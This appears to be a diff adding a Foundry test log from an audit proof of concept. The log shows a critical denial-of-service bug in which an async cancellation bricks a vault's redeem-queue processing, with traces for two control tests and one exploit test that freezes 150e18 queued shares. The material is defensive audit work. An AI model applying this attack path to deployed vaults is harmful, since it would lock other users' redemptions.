@@ -1,0 +1,213 @@
+Compiling 21 files with Solc 0.8.27
+Solc 0.8.27 finished in 1.76s
+Compiler run successful!
+
+Ran 3 tests for test/62970-critical-dos-in-queue-processing-if-async-cancellations-are_exp.sol:AsyncCancelQueueDosTest
+[PASS] test_control_fixedVault_cancelDoesNotDos() (gas: 620975)
+Traces:
+  [660775] AsyncCancelQueueDosTest::test_control_fixedVault_cancelDoesNotDos()
+    ├─ [34693] → new SyncStrategy@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 173 bytes of code
+    ├─ [360472] → new AccountableAsyncRedeemVaultFixed@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   ├─  storage changes:
+    │   │   @ 3: 0 → 1
+    │   │   @ 4: 0 → 1
+    │   │   @ 0: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   └─ ← [Return] 1468 bytes of code
+    ├─ [69596] AccountableAsyncRedeemVaultFixed::requestRedeem(50000000000000000000 [5e19], 0x000000000000000000000000000000000000aaaa)
+    │   ├─  storage changes:
+    │   │   @ 4: 1 → 2
+    │   │   @ 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e1: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
+    │   │   @ 0xac30f7d8bd4733703987e81105d25bfc20abf6e55da23bd9394b7c48089ff10f: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
+    │   │   @ 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0: 0 → 43690
+    │   └─ ← [Return] 1
+    ├─ [69596] AccountableAsyncRedeemVaultFixed::requestRedeem(100000000000000000000 [1e20], 0x000000000000000000000000000000000000BbBB)
+    │   ├─  storage changes:
+    │   │   @ 4: 2 → 3
+    │   │   @ 0x679795a0195a1b76cdebb7c51d74e058aee92919b8c3389af86ef24535e8a28c: 0 → 48059
+    │   │   @ 0x34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   │   @ 0x679795a0195a1b76cdebb7c51d74e058aee92919b8c3389af86ef24535e8a28d: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   └─ ← [Return] 2
+    ├─ [24976] AccountableAsyncRedeemVaultFixed::cancelRedeemRequest(1, 0x000000000000000000000000000000000000aaaa)
+    │   ├─ emit CancelRedeemRequest(controller: 0x000000000000000000000000000000000000aaaa, requestId: 1, caller: AsyncCancelQueueDosTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e2: 0 → 1
+    │   │   @ 0xac30f7d8bd4733703987e81105d25bfc20abf6e55da23bd9394b7c48089ff10f: 0x000000000000000000000000000000000000000000000002b5e3af16b1880000 → 0
+    │   └─ ← [Stop]
+    ├─ [442] AccountableAsyncRedeemVaultFixed::pendingRedeemRequest(0x000000000000000000000000000000000000aaaa) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "A cancel fully reduced under fix") [staticcall]
+    │   └─ ← [Return]
+    ├─ [504] AccountableAsyncRedeemVaultFixed::pendingCancelRedeemRequest(0x000000000000000000000000000000000000aaaa) [staticcall]
+    │   └─ ← [Return] false
+    ├─ [0] VM::assertFalse(false, "no lingering pending cancel under fix") [staticcall]
+    │   └─ ← [Return]
+    ├─ [25174] AccountableAsyncRedeemVaultFixed::processUpToShares(115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x679795a0195a1b76cdebb7c51d74e058aee92919b8c3389af86ef24535e8a28e: 0 → 1
+    │   │   @ 0x34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0
+    │   │   @ 3: 1 → 3
+    │   └─ ← [Stop]
+    ├─ [442] AccountableAsyncRedeemVaultFixed::pendingRedeemRequest(0x000000000000000000000000000000000000BbBB) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "B processed after fix") [staticcall]
+    │   └─ ← [Return]
+    ├─ [314] AccountableAsyncRedeemVaultFixed::nextRequestId() [staticcall]
+    │   └─ ← [Return] 3
+    ├─ [421] AccountableAsyncRedeemVaultFixed::lastRequestId() [staticcall]
+    │   └─ ← [Return] 3
+    ├─ [0] VM::assertEq(3, 3, "queue drained under fix") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+[PASS] test_control_noCancel_drainsQueue() (gas: 654334)
+Traces:
+  [694134] AsyncCancelQueueDosTest::test_control_noCancel_drainsQueue()
+    ├─ [34493] → new AsyncStrategy@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 172 bytes of code
+    ├─ [397709] → new AccountableAsyncRedeemVault@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   ├─  storage changes:
+    │   │   @ 3: 0 → 1
+    │   │   @ 0: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   @ 4: 0 → 1
+    │   └─ ← [Return] 1654 bytes of code
+    ├─ [69596] AccountableAsyncRedeemVault::requestRedeem(50000000000000000000 [5e19], 0x000000000000000000000000000000000000aaaa)
+    │   ├─  storage changes:
+    │   │   @ 0xac30f7d8bd4733703987e81105d25bfc20abf6e55da23bd9394b7c48089ff10f: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
+    │   │   @ 4: 1 → 2
+    │   │   @ 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e1: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
+    │   │   @ 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0: 0 → 43690
+    │   └─ ← [Return] 1
+    ├─ [69596] AccountableAsyncRedeemVault::requestRedeem(100000000000000000000 [1e20], 0x000000000000000000000000000000000000BbBB)
+    │   ├─  storage changes:
+    │   │   @ 0x679795a0195a1b76cdebb7c51d74e058aee92919b8c3389af86ef24535e8a28c: 0 → 48059
+    │   │   @ 0x679795a0195a1b76cdebb7c51d74e058aee92919b8c3389af86ef24535e8a28d: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   │   @ 0x34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   │   @ 4: 2 → 3
+    │   └─ ← [Return] 2
+    ├─ [48566] AccountableAsyncRedeemVault::processUpToShares(115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 3: 1 → 3
+    │   │   @ 0x679795a0195a1b76cdebb7c51d74e058aee92919b8c3389af86ef24535e8a28e: 0 → 1
+    │   │   @ 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e2: 0 → 1
+    │   │   @ 0xac30f7d8bd4733703987e81105d25bfc20abf6e55da23bd9394b7c48089ff10f: 0x000000000000000000000000000000000000000000000002b5e3af16b1880000 → 0
+    │   │   @ 0x34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0
+    │   └─ ← [Stop]
+    ├─ [442] AccountableAsyncRedeemVault::pendingRedeemRequest(0x000000000000000000000000000000000000aaaa) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "A processed") [staticcall]
+    │   └─ ← [Return]
+    ├─ [442] AccountableAsyncRedeemVault::pendingRedeemRequest(0x000000000000000000000000000000000000BbBB) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "B processed") [staticcall]
+    │   └─ ← [Return]
+    ├─ [314] AccountableAsyncRedeemVault::nextRequestId() [staticcall]
+    │   └─ ← [Return] 3
+    ├─ [421] AccountableAsyncRedeemVault::lastRequestId() [staticcall]
+    │   └─ ← [Return] 3
+    ├─ [0] VM::assertEq(3, 3, "queue fully drained") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+[PASS] test_exploit_asyncCancelBricksQueue() (gas: 2462522)
+Traces:
+  [2462522] AsyncCancelQueueDosTest::test_exploit_asyncCancelBricksQueue()
+    ├─ [1280538] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 6396 bytes of code
+    ├─ [1132878] Exploit::run()
+    │   ├─ [34493] → new AsyncStrategy@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 172 bytes of code
+    │   ├─ [397709] → new AccountableAsyncRedeemVault@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0 → 1
+    │   │   │   @ 4: 0 → 1
+    │   │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   └─ ← [Return] 1654 bytes of code
+    │   ├─ [273644] → new MiniToken@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x4c4f434b45442d5348415245530000000000000000000000000000000000001a
+    │   │   │   @ 0: 0 → 0x4c6f636b6564205368617265730000000000000000000000000000000000001a
+    │   │   └─ ← [Return] 1138 bytes of code
+    │   ├─ [69596] AccountableAsyncRedeemVault::requestRedeem(50000000000000000000 [5e19], 0x000000000000000000000000000000000000aaaa)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0: 0 → 43690
+    │   │   │   @ 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e1: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
+    │   │   │   @ 0xac30f7d8bd4733703987e81105d25bfc20abf6e55da23bd9394b7c48089ff10f: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
+    │   │   │   @ 4: 1 → 2
+    │   │   └─ ← [Return] 1
+    │   ├─ [69596] AccountableAsyncRedeemVault::requestRedeem(100000000000000000000 [1e20], 0x000000000000000000000000000000000000BbBB)
+    │   │   ├─  storage changes:
+    │   │   │   @ 4: 2 → 3
+    │   │   │   @ 0x679795a0195a1b76cdebb7c51d74e058aee92919b8c3389af86ef24535e8a28c: 0 → 48059
+    │   │   │   @ 0x679795a0195a1b76cdebb7c51d74e058aee92919b8c3389af86ef24535e8a28d: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   │   │   @ 0x34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   │   └─ ← [Return] 2
+    │   ├─ [25288] AccountableAsyncRedeemVault::cancelRedeemRequest(1, 0x000000000000000000000000000000000000aaaa)
+    │   │   ├─ [292] AsyncStrategy::onCancelRedeemRequest(AccountableAsyncRedeemVault: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 0x000000000000000000000000000000000000aaaa)
+    │   │   │   └─ ← [Return] false
+    │   │   ├─ emit CancelRedeemRequest(controller: 0x000000000000000000000000000000000000aaaa, requestId: 1, caller: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xac30f7d8bd4733703987e81105d25bfc20abf6e55da23bd9394b7c48089ff110: 0 → 1
+    │   │   └─ ← [Stop]
+    │   ├─ [504] AccountableAsyncRedeemVault::pendingCancelRedeemRequest(0x000000000000000000000000000000000000aaaa) [staticcall]
+    │   │   └─ ← [Return] true
+    │   ├─ [442] AccountableAsyncRedeemVault::pendingRedeemRequest(0x000000000000000000000000000000000000aaaa) [staticcall]
+    │   │   └─ ← [Return] 50000000000000000000 [5e19]
+    │   ├─ [1602] AccountableAsyncRedeemVault::processUpToShares(115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Revert] RedeemRequestWasCancelled()
+    │   ├─ [314] AccountableAsyncRedeemVault::nextRequestId() [staticcall]
+    │   │   └─ ← [Return] 1
+    │   ├─ [442] AccountableAsyncRedeemVault::pendingRedeemRequest(0x000000000000000000000000000000000000BbBB) [staticcall]
+    │   │   └─ ← [Return] 100000000000000000000 [1e20]
+    │   ├─ [442] AccountableAsyncRedeemVault::pendingRedeemRequest(0x000000000000000000000000000000000000aaaa) [staticcall]
+    │   │   └─ ← [Return] 50000000000000000000 [5e19]
+    │   ├─ [442] AccountableAsyncRedeemVault::pendingRedeemRequest(0x000000000000000000000000000000000000BbBB) [staticcall]
+    │   │   └─ ← [Return] 100000000000000000000 [1e20]
+    │   ├─ [44680] MiniToken::mint(0x000000000000000000000000000000000000D00d, 150000000000000000000 [1.5e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x494c6a187b5f0ab149a904d98255e546761031f5c4a839c3a72b33eb009c7912: 0 → 0x00000000000000000000000000000000000000000000000821ab0d4414980000
+    │   │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000000821ab0d4414980000
+    │   │   └─ ← [Stop]
+    │   ├─ [486] MiniToken::balanceOf(0x000000000000000000000000000000000000D00d) [staticcall]
+    │   │   └─ ← [Return] 150000000000000000000 [1.5e20]
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   @ 3: 0 → 0x00000000000000000000000000000000000000000000000821ab0d4414980000
+    │   │   @ 1: 0 → 0x000000000000000000000001ddc10602782af652bb913f7bde1fd82981db7dd9
+    │   │   @ 4: 0 → 0x00000000000000000000000000000000000000000000000821ab0d4414980000
+    │   │   @ 2: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   └─ ← [Return]
+    ├─ [323] Exploit::dosConfirmed() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "processUpToShares should revert (DoS)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [283] Exploit::bPendingAfter() [staticcall]
+    │   └─ ← [Return] 100000000000000000000 [1e20]
+    ├─ [0] VM::assertEq(100000000000000000000 [1e20], 100000000000000000000 [1e20], "B's redemption frozen in queue") [staticcall]
+    │   └─ ← [Return]
+    ├─ [253] Exploit::frozenShares() [staticcall]
+    │   └─ ← [Return] 150000000000000000000 [1.5e20]
+    ├─ [0] VM::assertEq(150000000000000000000 [1.5e20], 150000000000000000000 [1.5e20], "all queued shares frozen") [staticcall]
+    │   └─ ← [Return]
+    ├─ [373] Exploit::markerAddr() [staticcall]
+    │   └─ ← [Return] MiniToken: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]
+    ├─ [486] MiniToken::balanceOf(0x000000000000000000000000000000000000D00d) [staticcall]
+    │   └─ ← [Return] 150000000000000000000 [1.5e20]
+    ├─ [0] VM::assertEq(150000000000000000000 [1.5e20], 150000000000000000000 [1.5e20], "marker records frozen shares at SINK") [staticcall]
+    │   └─ ← [Return]
+    ├─ [412] Exploit::vaultAddr() [staticcall]
+    │   └─ ← [Return] AccountableAsyncRedeemVault: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
+    ├─ [314] AccountableAsyncRedeemVault::nextRequestId() [staticcall]
+    │   └─ ← [Return] 1
+    ├─ [0] VM::assertEq(1, 1, "queue head stuck at the cancelled request") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: a9fed82500000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ [1602] AccountableAsyncRedeemVault::processUpToShares(115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Revert] RedeemRequestWasCancelled()
+    └─ ← [Return]
+
+Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.23ms (1.95ms CPU time)
+
+Ran 1 test suite in 118.77ms (1.23ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
+_shared/run-poc/run_poc.sh: line 71: 39916 Killed: 9               nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: ~/RustroverProjects/audits/evm-hack-registry/62970-critical-dos-in-queue-processing-if-async-cancellations-are_exp)
